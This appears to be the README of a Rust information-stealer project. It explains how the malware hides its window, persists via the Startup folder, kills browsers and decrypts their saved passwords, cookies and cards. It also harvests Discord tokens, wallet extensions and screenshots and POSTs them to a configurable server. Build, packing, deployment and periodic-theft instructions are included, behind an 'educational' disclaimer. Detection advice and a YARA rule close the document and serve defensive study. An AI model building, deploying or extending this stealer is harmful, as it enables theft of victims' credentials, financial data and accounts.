# SRIS - Simple Rust Information Stealer

A Rust implementation of a simple information stealer targeting Chromium-based browsers, Discord tokens, system screenshots, and geolocation data.

## Overview

This project demonstrates malware development techniques in Rust, focusing on data exfiltration from popular applications. The stealer operates silently, collects sensitive information from multiple sources, and transmits the data to a remote server. It showcases evasion techniques including console window hiding, startup persistence, and asynchronous data collection.

## How It Works

1. **Initialization**: The malware hides its console window and copies itself to the Windows Startup folder for persistence
2. **Browser Termination**: Kills all running browser processes to unlock database files
3. **Data Collection**: Simultaneously gathers data from multiple sources:
   - Browser credentials (passwords, cookies, credit cards)
   - Discord authentication tokens
   - System screenshots
   - IP geolocation information
4. **Data Exfiltration**: Serializes collected data to JSON and transmits via HTTP POST with retry logic
5. **Process Termination**: Exits cleanly without leaving traces in memory (or optionally loops for periodic execution)

## Technical Details

### Key Components

#### 1. Browser Data Extraction (`browser/`)
- **crypto.rs**: Implements AES-256-GCM and Windows DPAPI decryption
  - Extracts master encryption keys from browser's Local State file
  - Decrypts Chrome v10/v11 encrypted data using AES-GCM
  - Falls back to DPAPI for legacy encryption
- **database.rs**: Generic SQLite extraction using trait-based design
  - `DatabaseExtractor<T>` trait for reusable query patterns
  - Temporary database copies to avoid file locks
  - Handles passwords, cookies, history, downloads, and credit cards
- **extensions.rs**: Cryptocurrency wallet extension extraction
  - Identifies and copies known crypto wallet extensions (MetaMask, Coinbase, etc.)
  - Preserves unknown extensions for analysis
- **Supported Browsers**:
  - Chrome (all variants: Stable, Beta, Dev, Canary)
  - Edge, Brave, Opera, Opera GX
  - Vivaldi, Yandex, and 10+ others

#### 2. Discord Token Harvesting (`discord/`)
- Scans Local Storage LevelDB files for Discord tokens
- Regex patterns for normal and MFA tokens:
  - `[\w-]{24}\.[\w-]{6}\.[\w-]{27}` (Standard tokens)
  - `mfa\.[\w-]{84}` (Multi-factor auth tokens)
- Processes `.log`, `.ldb`, and `.sqlite` files
- Deduplicates tokens using HashSet

#### 3. Screenshot Capture (`screenshot/`)
- Captures all monitor screens simultaneously
- Encodes images as PNG format
- Returns raw byte arrays for transmission

#### 4. Geolocation (`ip/`)
- Queries `ip-api.com` for victim information
- Collects: IP, country, city, ISP, timezone, coordinates

#### 5. Persistence & Evasion (`main.rs`)
- **Console Hiding**: Uses Windows API `ShowWindow(SW_HIDE)`
- **Startup Persistence**: Copies to `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`

## Building

### Requirements

- **Rust**: 1.75.0 or later (Edition 2024) ## I'm using the 1.90.0 ##
- **Cargo**: Latest stable version
- **Windows SDK**: For Win32 API access
- **Dependencies** (see `Cargo.toml`):
  - `reqwest` - HTTP client
  - `tokio` - Async runtime
  - `serde/serde_json` - Serialization
  - `rusqlite` - SQLite access
  - `aes-gcm` - AES-256-GCM decryption
  - `screenshots` - Screen capture
  - `regex` - Token pattern matching
  - `windows` - Win32 API bindings

### Build Instructions

#### 1. Development Build
```bash
cd Stealer
cargo build
```

#### 2. Release Build (Optimized)
```bash
cargo build --release
```
The executable will be in `target/release/Stealer.exe`

#### 3. Smaller Binary (Strip Symbols)
```bash
cargo build --release
strip target/release/Stealer.exe
```

#### 4. Optional: UPX Compression
```bash
upx --best --lzma target/release/Stealer.exe
```

## Usage

### Server Setup

1. **Install Python Dependencies (TEST SERVER)**:
```bash
pip install -r test-server\\requirements.txt
```

2. **Start the Collection TEST SERVER**:
```bash
python test-server\\test-server.py
```
Server runs on `http://0.0.0.0:5000`

3. **Configure Endpoint**:
Edit `src/main.rs` line 102:
```rust
const ENDPOINT: &str = "http://YOUR_SERVER_IP:YOUR_PORT/upload";
```

4. **Rebuild**:
```bash
cargo build --release
```

### Deployment

Simply execute the compiled binary:
```cmd
.\target\release\Stealer.exe
```

**What happens**:
1. Console window disappears immediately
2. Executable copies itself to Startup folder
3. Kill all running browsers
4. Data collection begins
5. Data transmitted to server
6. Process terminates silently

### Periodic Execution (Optional)

To enable periodic stealing, uncomment lines 110-112 in `main.rs`:
```rust
loop {
    if let Some(data) = collect_data().await {
        send_data(&client, data, ENDPOINT).await;
    }
    tokio::time::sleep(std::time::Duration::from_secs(INTERVAL_HOURS * 3600)).await;
}
```

## Test Server Output Structure

Collected data is organized by session timestamp:

```
stolen_data/
├── 20251217_143022_123456/
│   ├── summary.json             # Quick stats overview
│   ├── ip_info.json             # Geolocation data
│   ├── browser_data.json        # Complete browser dump
│   ├── passwords.json           # Login credentials
│   ├── cookies.json             # Session cookies
│   ├── history.json             # Browsing history
│   ├── downloads.json           # Download records
│   ├── cards.json               # Credit card data
│   ├── discord_tokens.json      # Discord auth tokens
│   └── screenshots/
│       ├── screenshot_1.png
│       ├── screenshot_2.png
│       └── screenshot_N.png
```

### Example `summary.json`:
```json
{
    "timestamp": "20251217_143022_123456",
    "ip": "203.0.113.42",
    "country": "United States",
    "passwords_count": 47,
    "cookies_count": 312,
    "history_count": 1893,
    "discord_tokens_count": 2,
    "screenshots_count": 2
}
```

## Code Structure

```
src/
├── main.rs                   # Entry point, persistence, exfiltration
├── browser/
│   ├── mod.rs                # Public API, orchestration
│   ├── crypto.rs             # DPAPI & AES-GCM decryption
│   ├── database.rs           # SQLite extraction (trait-based)
│   ├── types.rs              # Data structures
│   ├── config.rs             # Browser paths, extension IDs
│   ├── utils.rs              # Process killing, file ops
│   └── extensions.rs         # Crypto wallet extraction
├── discord/
│   ├── mod.rs                # Token scanning logic
│   ├── types.rs              # DiscordToken struct
│   └── config.rs             # Application paths
├── ip/
│   └── mod.rs                # Geolocation API client
├── screenshot/
│   └── mod.rs                # Screen capture wrapper
└── steam/                    # (Future: Steam session theft)
    └── mod.rs

test-server/
├── test-server.py            # Flask collection test server
├── requirements.txt          # Python dependencies

Cargo.toml                    # Rust dependencies
```

## Educational Purpose

⚠️ **DISCLAIMER**: This project is for **educational and research purposes only**. It demonstrates security research concepts and should only be used in controlled environments with proper authorization. Unauthorized use of these techniques may violate laws and regulations.

## Detection and Mitigation

### Detection Strategies

#### Behavioral Analysis
- Monitor for mass SQLite database access in browser directories
- Detect reading of `Local State` files containing encryption keys
- Track unusual screenshot capture frequency
- Alert on HTTP POST requests with large JSON payloads

#### File System Monitoring
- Watch `%APPDATA%\Roaming\Discord\Local Storage\leveldb\*.ldb`
- Monitor `%LOCALAPPDATA%\Google\Chrome\User Data\*\Login Data`
- Detect file copies to Startup folder

#### Network Indicators
- Unusual outbound POST requests to non-CDN endpoints
- Large JSON payloads containing base64-encoded images
- Suspicious user-agent strings or missing browser headers

#### Process Behavior
- Self-copying to Startup directory
- Console window hiding via `ShowWindow` API
- Simultaneous access to multiple browser database files

### Mitigation Approaches

#### For End Users
1. **Use Master Passwords**: Enable browser master passwords (Firefox, Brave)
2. **2FA Everything**: Two-factor authentication for all accounts
3. **Regular Audits**: Check Startup folder regularly
4. **EDR Solutions**: Deploy endpoint detection and response tools

#### For Organizations
1. **Application Whitelisting**: Only allow signed executables
2. **Behavior-Based Detection**: Deploy SIEM rules for stealer patterns
3. **Network Segmentation**: Isolate workstations from sensitive data stores
4. **Least Privilege**: Restrict write access to Startup folders

#### For Browser Vendors
1. **Hardware-Backed Encryption**: Use TPM for key storage (Chrome 127+ App-Bound)
2. **Protected Storage**: Require elevation for credential access
3. **Audit Logging**: Log all decryption operations
4. **Rate Limiting**: Throttle bulk credential access

## YARA Rules

```yara
rule RustBrowserStealer {
    meta:
        description = "Detects Rust-based browser stealer"
        author = "Security Researcher"
        date = "2025-12-17"
    
    strings:
        $rust1 = "rustc" ascii
        $rust2 = ".rustc_" ascii
        
        $browser1 = "Login Data" wide ascii
        $browser2 = "Local State" wide ascii
        $browser3 = "Cookies" wide ascii
        
        $crypto1 = "DPAPI" ascii
        $crypto2 = "encrypted_key" ascii
        
        $discord = "leveldb" ascii
        
        $api1 = "ShowWindow" ascii
        $api2 = "GetConsoleWindow" ascii
        
    condition:
        uint16(0) == 0x5A4D and
        (1 of ($rust*)) and
        (2 of ($browser*)) and
        (1 of ($crypto*)) and
        $discord and
        (1 of ($api*))
}
```

## License

This project is provided as-is for educational purposes. Use responsibly and ethically.

## Contributing

Contributions, suggestions, and improvements are welcome. Please ensure any modifications maintain the educational focus of this project.

---

**Last Updated**: December 2025  